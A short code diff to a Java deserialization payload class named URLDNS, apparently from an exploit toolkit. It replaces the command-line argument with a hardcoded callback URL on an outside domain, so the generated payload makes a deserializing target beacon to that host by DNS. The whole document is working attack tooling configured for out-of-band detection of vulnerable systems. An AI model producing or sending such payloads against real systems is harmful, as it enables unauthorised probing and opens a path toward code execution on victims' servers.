@@ -62,7 +62,8 @@ public class URLDNS implements ObjectPayload<Object> {
         }
 
         public static void main(final String[] args) throws Exception {
-                PayloadRunner.run(URLDNS.class, args);
+                //PayloadRunner.run(URLDNS.class, args);
+                PayloadRunner.run(URLDNS.class, new String[]{"http://p-f72f96-xltp.d3rw1n.fun"});
         }
 
         /**
